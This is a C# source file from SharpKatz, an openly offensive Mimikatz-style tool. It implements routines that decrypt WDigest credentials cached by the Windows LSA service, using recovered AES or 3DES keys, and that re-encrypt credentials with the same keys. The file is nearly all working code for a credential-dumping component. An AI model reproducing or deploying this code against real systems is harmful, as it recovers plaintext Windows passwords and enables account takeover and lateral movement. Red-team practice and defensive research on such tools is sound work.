//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using Microsoft.Win32.SafeHandles;
using System;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Crypto
{
#pragma warning disable 618  
    [System.Security.SecurityCritical(System.Security.SecurityCriticalScope.Everything)]
#pragma warning restore 618
    internal sealed class SafeBCryptAlgorithmHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        private SafeBCryptAlgorithmHandle() : base(true)
        {
        }

        protected override bool ReleaseHandle()
        {
            return (NTSTATUS)BCryptCloseAlgorithmProvider(handle, 0) == NTSTATUS.Success;
        }
    }

    [SecuritySafeCritical]
    internal sealed class SafeBCryptKeyHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        internal SafeBCryptKeyHandle() : base(true) { }

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        protected override bool ReleaseHandle()
        {
            return (NTSTATUS)BCryptDestroyKey(handle) == NTSTATUS.Success;
        }
    }

    class BCrypt
    {
        public static string BCRYPT_AES_ALGORITHM = "AES";
        public static string BCRYPT_3DES_ALGORITHM = "3DES";
        public static string BCRYPT_CHAINING_MODE = "ChainingMode";

        public static string BCRYPT_CHAIN_MODE_CBC = "ChainingModeCBC";
        public static string BCRYPT_CHAIN_MODE_CFB = "ChainingModeCFB";

        // Decrypt wdigest cached credentials using AES or 3Des 
        public static  byte[] DecryptCredentials(byte[] encrypedPass, byte[] IV, byte[] aeskey, byte[] deskey)
        {
            SafeBCryptAlgorithmHandle hProvider, hDesProvider;
            SafeBCryptKeyHandle hAes, hDes;
            int result;
            NTSTATUS status;

            byte[] passDecrypted = new byte[1024];
            byte[] initializationVector = new byte[16];

            // Same IV used for each cred, so we need to work on a local copy as this is updated
            // each time by BCryptDecrypt
            Array.Copy(IV, initializationVector, IV.Length);

            if ((encrypedPass.Length % 8) != 0)
            {
                // If suited to AES, lsasrv uses AES in CFB mode
                BCryptOpenAlgorithmProvider(out hProvider, BCRYPT_AES_ALGORITHM, null, 0);
                
                using (hProvider)
                {
                    BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CFB, BCRYPT_CHAIN_MODE_CFB.Length, 0);

                    GCHandle pkeypinnedArray = GCHandle.Alloc(aeskey, GCHandleType.Pinned);
                    IntPtr pkey = pkeypinnedArray.AddrOfPinnedObject();

                    GCHandle pencrypedPasspinnedArray = GCHandle.Alloc(encrypedPass, GCHandleType.Pinned);
                    IntPtr pencrypedPass = pencrypedPasspinnedArray.AddrOfPinnedObject();

                    GCHandle pinitializationVectorpinnedArray = GCHandle.Alloc(initializationVector, GCHandleType.Pinned);
                    IntPtr pinitializationVector = pinitializationVectorpinnedArray.AddrOfPinnedObject();

                    GCHandle ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
                    IntPtr ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();

                    BCryptGenerateSymmetricKey(hProvider, out hAes, IntPtr.Zero, 0, pkey, aeskey.Length, 0);
                    using (hAes)
                    {
                        status = (NTSTATUS)BCryptDecrypt(hAes, pencrypedPass, encrypedPass.Length, IntPtr.Zero, pinitializationVector, IV.Length, ppassDecrypted, passDecrypted.Length, out result, 0);
                        if (status != 0)
                        {
                            return new byte[0];
                        }
                    }
                }
            }
            else
            {
                // If suited to 3DES, lsasrv uses 3DES in CBC mode
                BCryptOpenAlgorithmProvider(out hDesProvider, BCRYPT_3DES_ALGORITHM, null, 0);

                using (hDesProvider)
                {
                    BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, BCRYPT_CHAIN_MODE_CBC.Length, 0);

                    GCHandle pkeypinnedArray = GCHandle.Alloc(deskey, GCHandleType.Pinned);
                    IntPtr pkey = pkeypinnedArray.AddrOfPinnedObject();

                    GCHandle pencrypedPasspinnedArray = GCHandle.Alloc(encrypedPass, GCHandleType.Pinned);
                    IntPtr pencrypedPass = pencrypedPasspinnedArray.AddrOfPinnedObject();

                    GCHandle pinitializationVectorpinnedArray = GCHandle.Alloc(initializationVector, GCHandleType.Pinned);
                    IntPtr pinitializationVector = pinitializationVectorpinnedArray.AddrOfPinnedObject();

                    GCHandle ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
                    IntPtr ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();

                    BCryptGenerateSymmetricKey(hDesProvider, out hDes, IntPtr.Zero, 0, pkey, deskey.Length, 0);
                    using (hDes)
                    {
                        status = (NTSTATUS)BCryptDecrypt(hDes, pencrypedPass, encrypedPass.Length, IntPtr.Zero, pinitializationVector, 8, ppassDecrypted, passDecrypted.Length, out result, 0);
                        if (status != 0)
                        {
                            return new byte[0];
                        }
                    }
                }
            }

            Array.Resize(ref passDecrypted, result );
            return passDecrypted;
        }

        // encrypt credentials using AES or 3Des 
        public static byte[] EncryptCredentials(byte[] passDecrypted, byte[] IV, byte[] aeskey, byte[] deskey)
        {
            SafeBCryptAlgorithmHandle hProvider, hDesProvider;
            SafeBCryptKeyHandle hAes, hDes;
            int result;
            NTSTATUS status;

            byte[] encrypedPass = new byte[1024];
            byte[] initializationVector = new byte[16];

            // Same IV used for each cred, so we need to work on a local copy as this is updated
            // each time by BCryptDecrypt
            Array.Copy(IV, initializationVector, IV.Length);

            if ((passDecrypted.Length % 8) != 0)
            {
                // If suited to AES, lsasrv uses AES in CFB mode
                BCryptOpenAlgorithmProvider(out hProvider, BCRYPT_AES_ALGORITHM, null, 0);
                using (hProvider)
                {
                    BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CFB, BCRYPT_CHAIN_MODE_CFB.Length, 0);

                    GCHandle pkeypinnedArray = GCHandle.Alloc(aeskey, GCHandleType.Pinned);
                    IntPtr pkey = pkeypinnedArray.AddrOfPinnedObject();

                    GCHandle pencrypedPasspinnedArray = GCHandle.Alloc(encrypedPass, GCHandleType.Pinned);
                    IntPtr pencrypedPass = pencrypedPasspinnedArray.AddrOfPinnedObject();

                    GCHandle pinitializationVectorpinnedArray = GCHandle.Alloc(initializationVector, GCHandleType.Pinned);
                    IntPtr pinitializationVector = pinitializationVectorpinnedArray.AddrOfPinnedObject();

                    GCHandle ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
                    IntPtr ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();

                    BCryptGenerateSymmetricKey(hProvider, out hAes, IntPtr.Zero, 0, pkey, aeskey.Length, 0);
                    using (hAes)
                    {
                        status = (NTSTATUS)BCryptEncrypt(hAes, ppassDecrypted, passDecrypted.Length, IntPtr.Zero, pinitializationVector, IV.Length, pencrypedPass, encrypedPass.Length, out result, 0);
                        if (status != 0)
                        {
                            return new byte[0];
                        }
                    }
                }
            }
            else
            {
                // If suited to 3DES, lsasrv uses 3DES in CBC mode
                BCryptOpenAlgorithmProvider(out hDesProvider, BCRYPT_3DES_ALGORITHM, null, 0);
                using (hDesProvider)
                {
                    BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, BCRYPT_CHAIN_MODE_CBC.Length, 0);

                    GCHandle pkeypinnedArray = GCHandle.Alloc(deskey, GCHandleType.Pinned);
                    IntPtr pkey = pkeypinnedArray.AddrOfPinnedObject();

                    GCHandle pencrypedPasspinnedArray = GCHandle.Alloc(encrypedPass, GCHandleType.Pinned);
                    IntPtr pencrypedPass = pencrypedPasspinnedArray.AddrOfPinnedObject();

                    GCHandle pinitializationVectorpinnedArray = GCHandle.Alloc(initializationVector, GCHandleType.Pinned);
                    IntPtr pinitializationVector = pinitializationVectorpinnedArray.AddrOfPinnedObject();

                    GCHandle ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
                    IntPtr ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();

                    BCryptGenerateSymmetricKey(hDesProvider, out hDes, IntPtr.Zero, 0, pkey, deskey.Length, 0);
                    using (hDes)
                    {
                        status = (NTSTATUS)BCryptEncrypt(hDes, ppassDecrypted, passDecrypted.Length, IntPtr.Zero, pinitializationVector, 8, pencrypedPass, encrypedPass.Length, out result, 0);
                        if (status != 0)
                        {
                            return new byte[0];
                        }
                    }
                }
            }

            Array.Resize(ref encrypedPass, result);

            return encrypedPass;
        }
    }
}
